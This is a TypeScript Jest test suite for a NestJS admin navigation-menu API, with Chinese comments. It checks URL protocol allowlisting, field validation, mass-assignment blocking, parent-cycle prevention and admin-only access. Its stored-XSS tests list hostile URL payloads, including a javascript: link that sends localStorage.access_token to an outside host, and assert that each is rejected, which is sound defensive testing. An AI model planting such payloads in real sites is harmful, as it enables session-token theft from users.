import { Repository } from 'typeorm';
import { MenuController } from './menu.controller';
import { MenuService } from './menu.service';
import { Menu } from './entities/menu.entity';
import { createHttpHarness, HttpHarness } from '../../common/testing/http-harness';

/**
 * 导航菜单写接口（仅 admin）走真实 HTTP：url 只能是 http(s) 或站内路径（后台列表把它渲染成链接，
 * javascript: 是存储型 XSS），target 只能是 _self / _blank，请求体是 class DTO，service 逐字段写库，父菜单不能成环。
 * 请求体按后台菜单弹窗（frontend/src/pages/Menu/index.tsx）的 handleSubmit 原样构造。
 */

jest.setTimeout(60_000);

describe('导航菜单接口 HTTP', () => {
  let h: HttpHarness;
  let repo: Repository<Menu>;
  let service: MenuService;

  /** 后台「新建菜单」：{ ...表单值, parentId: values.parentId || null } */
  const createForm = (extra: Record<string, unknown> = {}) => ({
    name: '首页',
    url: undefined,
    target: '_self',
    icon: undefined,
    sortOrder: 0,
    isActive: true,
    parentId: null,
    ...extra,
  });

  /** 后台「编辑菜单」：库里读出的值回填后原样提交（null 也原样） */
  const editForm = (m: Menu, extra: Record<string, unknown> = {}) => ({
    name: m.name,
    url: m.url ?? null,
    target: m.target,
    icon: m.icon ?? null,
    sortOrder: m.sortOrder,
    isActive: m.isActive,
    parentId: m.parentId ?? null,
    ...extra,
  });

  async function make(name: string, parentId: string | null = null, extra: Partial<Menu> = {}): Promise<Menu> {
    const saved = await repo.save(repo.create({ name, parentId, ...extra }));
    return repo.findOneByOrFail({ id: saved.id });
  }

  beforeAll(async () => {
    h = await createHttpHarness({ controllers: [MenuController], providers: [MenuService], entities: [Menu] });
    repo = h.ds.getRepository(Menu);
    service = h.moduleRef.get(MenuService);
  });

  afterAll(async () => {
    await h?.close();
  });

  beforeEach(async () => {
    await repo.clear();
  });

  describe('后台表单原样提交', () => {
    it.each(['https://example.com/a?b=1', 'http://example.com', '/about', '/', '', null, undefined])(
      '链接 %p 可以保存',
      async (url) => {
        const res = await h.post('/menus', 'admin', createForm({ url })).expect(201);
        expect(res.body.data.url ?? null).toBe(url ?? null);
      },
    );

    it('新建 → 编辑（null 回填）→ 设父菜单 → 清空父菜单 → 排序清空按 0', async () => {
      const res = await h.post('/menus', 'admin', createForm({ url: '/about', icon: 'home', target: '_blank' })).expect(201);
      const id = res.body.data.id;
      expect(await repo.findOneByOrFail({ id })).toMatchObject({ name: '首页', url: '/about', target: '_blank', icon: 'home', isActive: true, parentId: null, sortOrder: 0 });

      const parent = await make('顶级');
      await h.patch(`/menus/${id}`, 'admin', editForm(await repo.findOneByOrFail({ id }), { parentId: parent.id, isActive: false })).expect(200);
      expect(await repo.findOneByOrFail({ id })).toMatchObject({ parentId: parent.id, isActive: false });

      await h.patch(`/menus/${id}`, 'admin', editForm(await repo.findOneByOrFail({ id }), { parentId: null, sortOrder: null, url: null, icon: null })).expect(200);
      expect(await repo.findOneByOrFail({ id })).toMatchObject({ parentId: null, sortOrder: 0, url: null, icon: null });
    });
  });

  describe('链接协议白名单（存储型 XSS）', () => {
    it.each([
      'javascript:fetch("//x/?"+localStorage.access_token)',
      'JavaScript:alert(1)',
      ' javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      '//evil.example.com',
      '/\\evil.example.com',
      'example.com',
      'https://',
      'https://exa mple.com',
    ])('%s → 400，不落库', async (url) => {
      const res = await h.post('/menus', 'admin', createForm({ url })).expect(400);
      expect(res.body.message).toBe('链接只能是 http(s) 地址或站内路径（以 / 开头）');
      expect(await repo.count()).toBe(0);
    });

    it('编辑时改成 javascript: → 400，原链接不变', async () => {
      const m = await make('m', null, { url: '/safe' });
      await h.patch(`/menus/${m.id}`, 'admin', { url: 'javascript:alert(1)' }).expect(400);
      expect((await repo.findOneByOrFail({ id: m.id })).url).toBe('/safe');
    });
  });

  describe('字段校验与批量赋值', () => {
    it.each<[string, Record<string, unknown>, string]>([
      ['缺名称', { name: undefined }, '菜单名称不能为空'],
      ['名称超长', { name: '名'.repeat(101) }, '菜单名称不能超过 100 个字符'],
      ['target 任意字符串', { target: '_top' }, 'target 只能是 _self 或 _blank'],
      ['target 为 null', { target: null }, 'target 只能是 _self 或 _blank'],
      ['链接超长', { url: `https://example.com/${'a'.repeat(490)}` }, '链接不能超过 500 个字符'],
      ['图标超长', { icon: 'i'.repeat(101) }, '图标不能超过 100 个字符'],
      ['isActive 是字符串', { isActive: 'false' }, 'isActive must be a boolean value'],
      ['isActive 为 null', { isActive: null }, 'isActive must be a boolean value'],
      ['parentId 不是 UUID', { parentId: 'abc' }, 'parentId 必须是菜单 ID'],
      ['带 id', { id: '00000000-0000-4000-8000-000000000001' }, 'property id should not exist'],
      ['带 children', { children: [] }, 'property children should not exist'],
      ['带 createdAt', { createdAt: '2020-01-01T00:00:00.000Z' }, 'property createdAt should not exist'],
    ])('%s → 400', async (_label, extra, message) => {
      const res = await h.post('/menus', 'admin', createForm(extra)).expect(400);
      expect(res.body.message).toBe(message);
      expect(await repo.count()).toBe(0);
    });

    it('编辑：名称为 null / 空串 → 400，一列不变', async () => {
      const m = await make('keep');
      for (const body of [{ name: null }, { name: '' }, { id: 'x' }]) {
        await h.patch(`/menus/${m.id}`, 'admin', body).expect(400);
      }
      expect(await repo.findOneByOrFail({ id: m.id })).toEqual(m);
    });

    it('新建带已有菜单的 id：400，那个菜单一列不变', async () => {
      const victim = await make('victim', null, { url: '/v' });
      await h.post('/menus', 'admin', createForm({ id: victim.id, url: 'javascript:alert(1)' })).expect(400);
      expect(await repo.findOneByOrFail({ id: victim.id })).toEqual(victim);
    });

    it('绕过管道直接调 service：多余键写不进库；空提交不发 UPDATE', async () => {
      const victim = await make('victim2');
      const created = await service.create({ name: 'direct', id: victim.id, createdAt: new Date(0) } as never);
      expect(created.id).not.toBe(victim.id);
      expect(await repo.findOneByOrFail({ id: victim.id })).toEqual(victim);
      await service.update(created.id, { name: '改名', createdAt: new Date(0) } as never);
      const after = await repo.findOneByOrFail({ id: created.id });
      expect(after.name).toBe('改名');
      expect(after.createdAt.getTime()).not.toBe(0);

      const spy = jest.spyOn(repo, 'update');
      try {
        await h.patch(`/menus/${created.id}`, 'admin', {}).expect(200);
        expect(spy).not.toHaveBeenCalled();
      } finally {
        spy.mockRestore();
      }
    });
  });

  describe('父菜单', () => {
    it('不存在 → 400（此前撞外键 500）', async () => {
      const res = await h.post('/menus', 'admin', createForm({ parentId: '00000000-0000-4000-8000-0000000000aa' })).expect(400);
      expect(res.body.message).toBe('父菜单不存在');
    });

    it('设为自己 / 自己的子孙 → 400', async () => {
      const root = await make('root');
      const child = await make('child', root.id);
      let res = await h.patch(`/menus/${root.id}`, 'admin', { parentId: root.id }).expect(400);
      expect(res.body.message).toBe('不能把菜单设为自己的父菜单');
      res = await h.patch(`/menus/${root.id}`, 'admin', { parentId: child.id }).expect(400);
      expect(res.body.message).toBe('不能把菜单移到它自己的子菜单下');
      expect((await repo.findOneByOrFail({ id: root.id })).parentId).toBeNull();
    });

    it('大写的 ID：设自己为父 / 路径用大写把自己挂到子菜单下 → 400；合法的大写父菜单按小写存', async () => {
      const root = await make('upper-root');
      const child = await make('upper-child', root.id);
      let res = await h.patch(`/menus/${root.id}`, 'admin', { parentId: root.id.toUpperCase() }).expect(400);
      expect(res.body.message).toBe('不能把菜单设为自己的父菜单');
      res = await h.patch(`/menus/${root.id.toUpperCase()}`, 'admin', { parentId: child.id }).expect(400);
      expect(res.body.message).toBe('不能把菜单移到它自己的子菜单下');
      expect((await repo.findOneByOrFail({ id: root.id })).parentId).toBeNull();

      const created = await h.post('/menus', 'admin', createForm({ name: 'upper-new', parentId: child.id.toUpperCase() })).expect(201);
      expect((await repo.findOneByOrFail({ id: created.body.data.id })).parentId).toBe(child.id);
    });

    it('路径里的 id 不是 UUID → 400', async () => {
      for (const res of [
        await h.patch('/menus/not-a-uuid', 'admin', { name: 'x' }).expect(400),
        await h.del('/menus/123', 'admin').expect(400),
      ]) {
        expect(res.body.message).toBe('路径里的 id 必须是 UUID');
      }
    });

    it('库的排序规则不区分大小写时（模拟生产 MySQL）：成环检查同样拦得住', async () => {
      const rows = new Map<string, Menu>();
      const put = (m: Partial<Menu>) => rows.set(m.id!.toLowerCase(), { ...m } as Menu);
      const ci = {
        findOne: async ({ where }: { where: { id: string } }) => {
          const row = rows.get(String(where.id).toLowerCase());
          return row ? { ...row } : null;
        },
        update: jest.fn(),
      };
      const ciService = new MenuService(ci as never);
      const a = 'aaaaaaaa-0000-4000-8000-000000000001';
      const b = 'bbbbbbbb-0000-4000-8000-000000000002';
      put({ id: a, name: 'A', parentId: null });
      put({ id: b, name: 'B', parentId: a });

      await expect(ciService.update(a, { parentId: a.toUpperCase() })).rejects.toThrow('不能把菜单设为自己的父菜单');
      await expect(ciService.update(a.toUpperCase(), { parentId: b })).rejects.toThrow('不能把菜单移到它自己的子菜单下');
      put({ id: b, name: 'B', parentId: a.toUpperCase() });
      await expect(ciService.update(a, { parentId: b })).rejects.toThrow('不能把菜单移到它自己的子菜单下');
      expect(ci.update).not.toHaveBeenCalled();
    });
  });

  it('仅 admin：editor / 无角色用户 403、游客 401', async () => {
    await h.post('/menus', 'anonymous', createForm()).expect(401);
    await h.post('/menus', 'plain', createForm()).expect(403);
    await h.post('/menus', 'editor', createForm()).expect(403);
    await h.get('/menus', 'editor').expect(403);
    expect(await repo.count()).toBe(0);
  });
});
